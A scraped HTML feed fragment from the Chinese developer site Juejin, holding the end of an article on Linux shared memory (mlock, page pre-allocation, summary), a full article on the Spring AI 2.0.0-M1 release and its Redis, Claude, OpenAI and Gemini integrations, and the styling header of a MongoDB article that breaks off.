<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 锁定共享内存，防止交换</span>
<span class="hljs-keyword">if</span> (mlock(shm_addr, shm_size) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"mlock"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>预分配页面</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 访问所有页面，触发分配</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; shm_size; i += PAGE_SIZE) {
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> *p = (<span class="hljs-type">char</span> *)shm_addr + i;
    *p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 触发页面分配</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-40">10. 总结</h2>
<h3 data-id="heading-41">10.1 关键点</h3>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li>基于 key 的标识方式</li>
<li>使用 <code>shmget/shmat/shmdt/shmctl</code> API</li>
<li>基于 tmpfs 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li>基于文件名的标识方式</li>
<li>使用 <code>shm_open/mmap/munmap</code> API</li>
<li>更符合 POSIX 标准</li>
</ul>
</li>
<li>
<p><strong>底层实现</strong>：</p>
<ul>
<li>共享内存段是 tmpfs 文件</li>
<li>通过 <code>mmap()</code> 映射到进程地址空间</li>
<li>使用 VMA 管理映射</li>
<li>延迟分配页面</li>
</ul>
</li>
<li>
<p><strong>同步机制</strong>：</p>
<ul>
<li>需要额外的同步机制（信号量、互斥锁等）</li>
<li>避免竞争条件</li>
</ul>
</li>
</ol>
<h3 data-id="heading-42">10.2 适用场景</h3>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<h3 data-id="heading-43">10.3 最佳实践</h3>
<ol>
<li><strong>错误处理</strong>：始终检查系统调用的返回值</li>
<li><strong>资源清理</strong>：及时分离和删除共享内存</li>
<li><strong>同步机制</strong>：使用适当的同步机制保护共享数据</li>
<li><strong>性能优化</strong>：使用大页面、内存对齐等技术</li>
</ol>
<hr/>
<p><strong>文档结束</strong></p>
<h3 data-id="heading-44">7.1 关键点</h3>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li>基于 key 的标识方式</li>
<li>使用 <code>shmget/shmat/shmdt/shmctl</code> API</li>
<li>基于 tmpfs 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li>基于文件名的标识方式</li>
<li>使用 <code>shm_open/mmap/munmap</code> API</li>
<li>更符合 POSIX 标准</li>
</ul>
</li>
<li>
<p><strong>底层实现</strong>：</p>
<ul>
<li>共享内存段是 tmpfs 文件</li>
<li>通过 <code>mmap()</code> 映射到进程地址空间</li>
<li>使用 VMA 管理映射</li>
</ul>
</li>
<li>
<p><strong>同步机制</strong>：</p>
<ul>
<li>需要额外的同步机制（信号量、互斥锁等）</li>
<li>避免竞争条件</li>
</ul>
</li>
</ol>
<h3 data-id="heading-45">7.2 适用场景</h3>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！]]></title>    <link>https://juejin.cn/post/7583992239103410228</link>    <guid>https://juejin.cn/post/7583992239103410228</guid>    <pubDate>2025-12-16T06:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103410228" data-draft-id="7583973613198196751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T06:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:26:20.000Z" title="Tue Dec 16 2025 06:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Spring AI 团队刚刚发布了 <strong>Spring AI 2.0.0-M1</strong>。这不仅是一次常规的版本迭代，更是 2.x 系列的正式开篇：<strong>技术栈、基线版本、模型生态几乎经历了一轮“大换血”。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feac104b70b4437d984458ed3db86032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=MLMJ2XscSs6CHnRUP3X28qVnuVg%3D" alt="" loading="lazy"/></p>
<p>在此之前，Spring AI 1.1 正式版于上月发布，带来了 MCP 开箱即用、Prompt 缓存、自进化智能体等特性。</p>
<p>本次里程碑版本基于 <strong>Spring Boot 4.0 GA</strong> 和 <strong>Spring Framework 7.0</strong> 构建，以 <strong>Jakarta EE 11</strong> 为基石，并<strong>强制要求 Java 21</strong> 作为最低开发环境。</p>
<p>整体来看，Spring AI 2.0.0-M1 一共合入了 <strong>67 项改动</strong>，包括：</p>
<ul>
<li><strong>25 项功能增强</strong>：围绕 AI 原生开发体验做了大幅扩展；</li>
<li><strong>32 项文档更新</strong>：对新手更友好，踩坑前多看一眼能省不少时间；</li>
<li><strong>7 个稳定性修复 + 3 个安全依赖升级</strong>：把基础打得更稳。</li>
</ul>
<p>下面按模块简单拆一下这次版本的几个关键变化。</p>
<h2 data-id="heading-0">底层架构全面跟进：Spring Boot 4 &amp; Framework 7</h2>
<p>这是 Spring AI 2.0 最根本的变化。Spring AI 已经从 Spring Boot 3.x 全面迁到 <strong>Spring Boot 4.0 GA</strong> / <strong>Spring Framework 7.0</strong>。</p>
<p><strong>这意味着：</strong></p>
<ul>
<li>
<p><strong>红利</strong>：你可以直接享受到新一代框架在 <strong>虚拟线程</strong>、<strong>AOT 编译</strong>、<strong>性能调优</strong> 等方面的所有新特性。</p>
</li>
<li>
<p><strong>成本</strong>：必须将运行环境升级到 <strong>Java 21</strong>。对于老项目而言，这是迁移前需要重点评估的成本。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1f8f2c057b847fd9858b0609e823db8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=SfbNJBQvEOmbr1RKQ0V9fHg88ik%3D" alt="" loading="lazy"/></p>
<p>对应的 issue 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Fspring-projects%2Fspring-ai%2Fpull%2F4774" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/spring-projects/spring-ai/pull/4774" ref="nofollow noopener noreferrer">github.com/spring-proj…</a></p>
<p>Spring Boot 4.0 的新特性我也发文章详细介绍过：Spring Boot 4.0 正式发布，人已麻。。。</p>
<h2 data-id="heading-1">Redis 生态深化：记忆能力 + 检索能力双升级</h2>
<p>Redis 在本次更新中获得了史诗级的增强，成为构建企业级 AI 应用的首选存储方案之一。</p>
<h2 data-id="heading-2">1.Redis Chat Memory 全新实现</h2>
<p>新增了基于 Redis 的聊天记忆组件（含 Spring Boot Starter），核心特性包括：</p>
<ul>
<li>
<p><strong>持久化记忆</strong>：支持跨会话保留上下文，不再丢失用户历史。</p>
</li>
<li>
<p><strong>检索增强</strong>：支持文本搜索与范围查询。</p>
</li>
<li>
<p><strong>性能调优</strong>：针对向量检索的 <strong>HNSW 索引参数</strong>（M, efConstruction, efRuntime）完全开放配置。这意味着你可以根据业务需求，在“召回率”与“时延”之间做精细平衡。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f90e921f95fd47dcb5111ae69e9e1959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=FQQBXF4L%2BWJK3HjZ6hTeu%2Bmrrmo%3D" alt="" loading="lazy"/></p>
<p>对应的文档地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.spring.io%2Fspring-ai%2Freference%2F2.0%2Fapi%2Fvectordbs%2Fredis.html" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.spring.io/spring-ai/reference/2.0/api/vectordbs/redis.html" ref="nofollow noopener noreferrer">docs.spring.io/spring-ai/r…</a></p>
<h2 data-id="heading-3">2.Redis Vector Store 升级</h2>
<p>向量存储能力同步升级：</p>
<ul>
<li>新增 <strong>文本搜索</strong> 和 <strong>范围查询</strong> 能力。</li>
<li>同样暴露 HNSW 相关参数，方便进行细粒度的性能权衡。</li>
</ul>
<p>Maven 依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-redis-store<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>如果你的技术栈里已经有了 Redis，引入这个依赖可以让你无需额外部署专门的向量数据库（如 Milvus、Chroma）或记忆存储组件，直接利用现有的 Redis 基础设施就能构建生产级的 AI 应用。</p>
<h2 data-id="heading-4">模型能力的全面爆发：Claude, OpenAI 与 Gemini</h2>
<p>在大模型接入层，这次的更新也相当密集。</p>
<ul>
<li><strong>Anthropic Claude：一口气上到 4.5</strong></li>
<li>
<ul>
<li>新增对 <strong>Claude 4.5 Opus / Haiku</strong> 的支持；</li>
<li>引入 <strong>Citations API</strong>：可以在回答中精确标注来源文档的具体片段（PDF、纯文本等），对 RAG、问答类场景非常有用，目前支持 Claude 3.7 Sonnet 和 Claude 4 系列；</li>
<li>集成 <strong>Files API</strong>：模型可以直接生成可下载文件（代码、报告等），更适合做 Agent / 工具型应用；</li>
<li>工具调用能力新增 Auto / Any / Tool / None 四种模式，方便精细控制“模型何时、如何用工具”。</li>
</ul>
</li>
<li><strong>OpenAI：官方 Java SDK 原生接入</strong></li>
<li>
<ul>
<li>
<p>Spring AI 现在直接集成了 <strong>OpenAI 官方 Java SDK</strong>。</p>
</li>
<li>
<p>默认聊天模型也更新为当前前沿的 gpt-5-mini，开箱即用的效果会比老版本好不少。</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d114630c811437994f9fffae4cdc7d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=EcC%2FSwDKQsbnsxYhNMlgCpneMCU%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Google Gemini：思考深度可调：</strong> Google GenAI SDK 升级到 <strong>1.30.0</strong>，并为 Gemini 模型补上了 ThinkingConfig / ThinkingLevel 配置。简单理解：可以通过配置项来控制“模型想多深”，在推理质量和响应时延之间找到更合适的平衡点。</li>
</ul>
<h2 data-id="heading-5">企业级特性与基础设施扩展</h2>
<p>除了模型和存储，这次在基础设施侧也做了几处针对企业场景的补强：</p>
<ul>
<li><strong>Azure Cosmos DB Chat Memory：</strong> 新增了对应的 Spring Boot Starter，Azure 生态的同学可以直接把聊天记录落在 Cosmos DB 里，少写不少样板代码。</li>
<li><strong>Model Context Protocol（MCP）增强：</strong> 优化了 MCP 客户端的自动配置流程，引入可选的处理器注册表，并改善了对复杂 Bean 类型的支持，让 MCP 能更自然地融入现有 Spring 应用。</li>
<li><strong>GemFire 向量存储安全加固:</strong>  GemFire Vector Store 现在支持 <strong>用户名 / 密码认证</strong>，对有合规要求的企业环境更友好。</li>
</ul>
<h2 data-id="heading-6">总结</h2>
<p>下面是 <strong>Spring AI 2.0.0-M1</strong> 带来的关键升级：</p>
<ol>
<li><strong>基座升级</strong>：全面基于 <strong>Spring Boot 4.0 GA</strong> 和 <strong>Spring Framework 7.0</strong> 构建，<strong>强制要求 Java 21</strong>。</li>
<li><strong>Redis 史诗级增强</strong>：新增 Redis Chat Memory（支持持久化、搜索），向量存储支持文本搜索与 HNSW 参数调优，确立了 Redis 在 Spring AI 生态中 RAG/记忆系统的首选方案之一。</li>
<li><strong>模型生态爆发</strong>：</li>
<li><strong>Anthropic</strong>：支持 Claude 4.5，新增 Citations API（引用溯源）和 Files API（生成文件）。</li>
<li><strong>OpenAI</strong>：集成官方 Java SDK，默认模型更新为 gpt-5-mini。</li>
<li><strong>Google</strong>：Gemini 支持思考深度（ThinkingLevel）配置。</li>
<li><strong>企业级特性</strong>：新增 Azure Cosmos DB 聊天记忆，增强 MCP 客户端配置，GemFire 支持安全认证。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDB深入与实战：基于SQL的对照解析]]></title>    <link>https://juejin.cn/post/7583992239103590452</link>    <guid>https://juejin.cn/post/7583992239103590452</guid>    <pubDate>2025-12-16T06:44:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103590452" data-draft-id="7584043969686683700" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDB深入与实战：基于SQL的对照解析"/> <meta itemprop="keywords" content="面试,后端"/> <meta itemprop="datePublished" content="2025-12-16T06:44:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小橙编码日志"/> <meta itemprop="url" content="https://juejin.cn/user/3562867149506392"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDB深入与实战：基于SQL的对照解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562867149506392/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小橙编码日志
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:44:32.000Z" title="Tue Dec 16 2025 06:44:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"🕛";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1️⃣"}.markdown-body ol&gt;li:nth-child(2):before{content:"2️⃣"}.markdown-body ol&gt;li:nth-child(3):before{content:"3️⃣"}.markdown-body ol&gt;li:nth-child(4):before{content:"4️⃣"}.markdown-body ol&gt;li:nth-child(5):before{content:"5️⃣"}.markdown-body ol&gt;li:nth-child(6):before{content:"6️⃣"}.markdown-body ol&gt;li:nth-child(7):before{content:"7️⃣"}.markdown-body ol&gt;li:nth-child(8):before{content:"8️⃣"}.markdown-body ol&gt;li:nth-child(9):before{content:"9️⃣"}.markdown-body ol&gt;li:nth-child(10):before{content:"🔟"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"🔹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="hybrid">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1d1f21}.hljs::selection,.hljs 